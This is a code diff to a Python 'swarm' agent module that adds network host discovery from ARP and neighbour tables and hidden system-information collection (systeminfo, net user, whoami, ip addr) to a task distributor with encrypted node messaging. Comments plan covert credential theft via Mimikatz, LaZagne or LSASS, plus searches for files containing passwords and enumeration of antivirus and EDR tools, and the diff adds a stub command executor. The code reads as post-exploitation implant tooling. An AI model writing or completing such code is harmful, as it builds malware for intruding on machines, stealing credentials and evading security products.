@@ -28,11 +28,12 @@ import threading
 import ipaddress
 import logging
 import subprocess
-from typing import Dict, List, Set, Any, Optional, Union, Tuple
+from typing import Dict, List, Set, Any, Optional, Union, Tuple, Callable
 from datetime import datetime
 from pathlib import Path
 from nacl.public import PrivateKey, PublicKey, Box
 import nacl.utils
+import platform
 
 # Настройка логирования
 logging.basicConfig(
@@ -1284,29 +1285,161 @@ class TaskDistributor:
         
         return result
     
-    # Вспомогательные методы для выполнения задач...
     def _scan_local_network(self) -> Dict[str, Any]:
-        """Сканирует локальную сеть."""
-        return {"message": "Network scanning function placeholder"}
-    
+        """Сканирует локальную сеть для обнаружения других хостов."""
+        logger.info(f"Node {self.node.node_id}: Сканирование локальной сети...")
+        results = {
+            "timestamp": datetime.now().isoformat(),
+            "method": "passive", # По умолчанию пассивный метод
+            "hosts": [],
+            "errors": []
+        }
+        command = ""
+        parser: Optional[Callable[[str], List[Dict[str, str]]]] = None
+
+        def parse_arp_windows(output: str) -> List[Dict[str, str]]:
+            hosts = []
+            lines = output.splitlines()
+            interface_section = False
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    interface_section = False
+                    continue
+                if line.startswith("Interface:"):
+                    interface_section = True
+                    continue
+                if interface_section and len(line.split()) >= 3:
+                    parts = line.split()
+                    ip_addr = parts[0]
+                    mac_addr = parts[1].replace("-", ":").lower()
+                    addr_type = parts[2]
+                    # Проверяем, что это валидный IP (не 224.x.x.x, 255.255.255.255 и т.д.)
+                    try:
+                        ip = ipaddress.ip_address(ip_addr)
+                        if not ip.is_multicast and not ip.is_loopback and not ip.is_link_local and str(ip) != "255.255.255.255":
+                             if mac_addr != "ff:ff:ff:ff:ff:ff":
+                                 hosts.append({"ip": ip_addr, "mac": mac_addr, "type": addr_type})
+                    except ValueError:
+                        continue # Невалидный IP
+            return hosts
+
+        def parse_ip_neigh_linux(output: str) -> List[Dict[str, str]]:
+            hosts = []
+            lines = output.splitlines()
+            for line in lines:
+                parts = line.split()
+                if len(parts) < 5:
+                    continue
+                ip_addr = parts[0]
+                mac_addr = parts[3]
+                state = parts[-1]
+                if mac_addr != "00:00:00:00:00:00" and state.upper() in ["REACHABLE", "STALE", "DELAY", "PROBE"]:
+                    try:
+                        ip = ipaddress.ip_address(ip_addr)
+                        if not ip.is_multicast and not ip.is_loopback and not ip.is_link_local:
+                             hosts.append({"ip": ip_addr, "mac": mac_addr, "state": state})
+                    except ValueError:
+                        continue
+            return hosts
+
+        os_platform = platform.system()
+        if os_platform == "Windows":
+            command = "arp -a"
+            parser = parse_arp_windows
+        elif os_platform == "Linux":
+            command = "ip neigh show"
+            parser = parse_ip_neigh_linux
+        else:
+            results["errors"].append("Unsupported platform for passive scan")
+            return results
+
+        if command and parser:
+            exit_code, output = execute_command(command)
+            if exit_code == 0:
+                try:
+                    results["hosts"] = parser(output)
+                    logger.info(f"Node {self.node.node_id}: Обнаружено хостов (пассивно): {len(results['hosts'])}")
+                except Exception as e:
+                     results["errors"].append(f"Error parsing command output: {str(e)}")
+                     logger.error(f"Node {self.node.node_id}: Ошибка парсинга вывода '{command}': {str(e)}", exc_info=True)
+            else:
+                results["errors"].append(f"Command '{command}' failed with code {exit_code}")
+                logger.warning(f"Node {self.node.node_id}: Команда '{command}' завершилась с кодом {exit_code}")
+        
+        # TODO: Добавить активное сканирование (nmap, fping, Test-NetConnection) как опцию
+        # if self.allow_active_scan:
+        #    results["method"] = "active"
+        #    active_hosts = self._perform_active_scan()
+        #    # Объединить результаты
+
+        return results
+
     def _collect_system_info(self) -> Dict[str, Any]:
-        """Собирает информацию о системе."""
-        return {"message": "System info collection placeholder"}
-    
+        """Собирает базовую информацию о системе с помощью системных команд."""
+        logger.info(f"Node {self.node.node_id}: Сбор системной информации...")
+        info = {
+            "platform": platform.system(),
+            "node_id": self.node.node_id,
+            "timestamp": datetime.now().isoformat(),
+            "hostname": socket.gethostname(),
+            "details": {}
+        }
+        commands = []
+        
+        if info["platform"] == "Windows":
+            commands = [
+                ("systeminfo", "systeminfo"), 
+                ("ipconfig", "ipconfig /all"),
+                ("users", "net user")
+                # Добавить другие команды: wmic cpu get name, wmic memorychip get capacity, etc.
+            ]
+        elif info["platform"] == "Linux":
+            commands = [
+                ("uname", "uname -a"),
+                ("os_release", "cat /etc/os-release"), # Более надежно чем lsb_release
+                ("cpuinfo", "lscpu"),
+                ("meminfo", "free -h"),
+                ("ipaddr", "ip addr"),
+                ("whoami", "whoami"),
+                # ("users", "cat /etc/passwd") # Может быть слишком много данных
+            ]
+        else:
+             info["details"]["error"] = "Unsupported platform"
+             return info
+             
+        results = {}
+        for key, cmd in commands:
+            exit_code, output = execute_command(cmd)
+            results[key] = {"exit_code": exit_code, "output": output}
+            time.sleep(0.1) # Небольшая пауза между командами
+            
+        info["details"] = results
+        logger.info(f"Node {self.node.node_id}: Сбор системной информации завершен.")
+        return info
+
     def _extract_credentials(self) -> Dict[str, Any]:
-        """Извлекает учетные данные."""
+        # TODO: Реализовать безопасный и скрытый сбор учетных данных
+        # Используя Mimikatz, LaZagne, или доступ к LSASS (см. secret_dev_notes.md)
+        logger.warning(f"Node {self.node.node_id}: Функция извлечения учетных данных не реализована (placeholder).")
         return {"message": "Credential extraction placeholder"}
-    
+
     def _find_sensitive_documents(self) -> Dict[str, Any]:
-        """Ищет конфиденциальные документы."""
+        # TODO: Реализовать поиск документов по ключевым словам и шаблонам
+        # Например, поиск файлов *.doc, *.xls, *.pdf, *.txt содержащих "password", "secret", "confidential"
+        logger.warning(f"Node {self.node.node_id}: Функция поиска документов не реализована (placeholder).")
         return {"message": "Document search placeholder"}
-    
+
     def _scan_for_vulnerabilities(self) -> Dict[str, Any]:
-        """Сканирует систему на наличие уязвимостей."""
+        # TODO: Реализовать сканирование известных уязвимостей
+        # Например, проверка версий ПО, запущенных служб, использование локальных сканеров (если есть)
+        logger.warning(f"Node {self.node.node_id}: Функция сканирования уязвимостей не реализована (placeholder).")
         return {"message": "Vulnerability scanning placeholder"}
-    
+
     def _analyze_security_products(self) -> Dict[str, Any]:
-        """Анализирует продукты безопасности."""
+        # TODO: Реализовать анализ запущенных антивирусов, EDR, файрволов
+        # Например, проверка списка процессов, служб, драйверов
+        logger.warning(f"Node {self.node.node_id}: Функция анализа защитных продуктов не реализована (placeholder).")
         return {"message": "Security product analysis placeholder"}
 
 # Пример использования (закомментирован)
@@ -1346,3 +1479,67 @@ class SecureSwarmComm:
         nonce = data[:Box.NONCE_SIZE]
         ciphertext = data[Box.NONCE_SIZE:]
         return box.decrypt(ciphertext, nonce) 
+
+# ЗАГЛУШКА execute_command - ИСПОЛЬЗУЙТЕ РЕАЛЬНЫЙ ВЫЗОВ command_executor
+def execute_command(command_line: str, timeout_ms: int = 10000, hidden: bool = True) -> Tuple[int, str]:
+    logger.warning(f"Используется ЗАГЛУШКА execute_command для: {command_line}")
+    if platform.system() == "Windows":
+        if "systeminfo" in command_line:
+            return 0, """OS Name:                   Microsoft Windows 11 Pro
+OS Version:                10.0.22631 N/A Build 22631
+System Manufacturer:       LENOVO
+System Model:              20XW004QRT
+Processor(s):            1 Processor(s) Installed.
+                         [01]: Intel64 Family 6 Model 140 Stepping 1 GenuineIntel ~1690 Mhz
+Total Physical Memory:     15,886 MB"""
+        elif "ipconfig /all" in command_line:
+             return 0, """Windows IP Configuration
+   Host Name . . . . . . . . . . . . : DESKTOP-AGENTX
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet:
+   Connection-specific DNS Suffix  . : home
+   Description . . . . . . . . . . . : Realtek PCIe GbE Family Controller
+   Physical Address. . . . . . . . . : A8-5E-45-FF-00-11
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.1.100(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
+   DNS Servers . . . . . . . . . . . : 8.8.8.8
+                                       8.8.4.4"""
+        elif "net user" in command_line:
+             return 0, """User accounts for \\\\DESKTOP-AGENTX
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+User1                  WDAGUtilityAccount       
+The command completed successfully."""
+    else: # Linux
+        if "uname -a" in command_line:
+            return 0, "Linux agentx-dev 5.15.0-76-generic #83-Ubuntu SMP Mon Jun 5 14:18:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux"
+        elif "lscpu" in command_line:
+             return 0, """Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+CPU(s):              8
+Model name:          Intel(R) Core(TM) i7-1165G7 @ 2.80GHz
+Vendor ID:           GenuineIntel"""
+        elif "free -h" in command_line:
+             return 0, """              total        used        free      shared  buff/cache   available
+Mem:           15Gi       8.1Gi       1.1Gi       1.3Gi       6.4Gi       6.0Gi
+Swap:         2.0Gi       100Mi       1.9Gi"""
+        elif "ip addr" in command_line:
+             return 0, """1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic eth0
+       valid_lft 86300sec preferred_lft 86300sec"""
+        elif "whoami" in command_line:
+            return 0, "agentx_user"
+    return 1, "Dummy output for this command" 
